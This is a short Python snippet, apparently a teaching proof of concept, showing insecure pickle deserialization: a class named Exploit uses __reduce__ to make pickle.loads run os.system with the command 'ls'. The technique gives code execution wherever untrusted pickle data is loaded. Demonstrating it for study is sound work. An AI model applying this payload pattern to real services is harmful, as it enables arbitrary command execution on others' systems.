import pickle
import os

# serialize
s = pickle.dumps({"cat":"meow"})

# unserialize
pickle.loads(s)

class Exploit(object):
    # __reduce__ defines what to return after unserializing
    def __reduce__(self): 
        return (os.system, ('ls',))

pickle.loads(pickle.dumps(Exploit()))


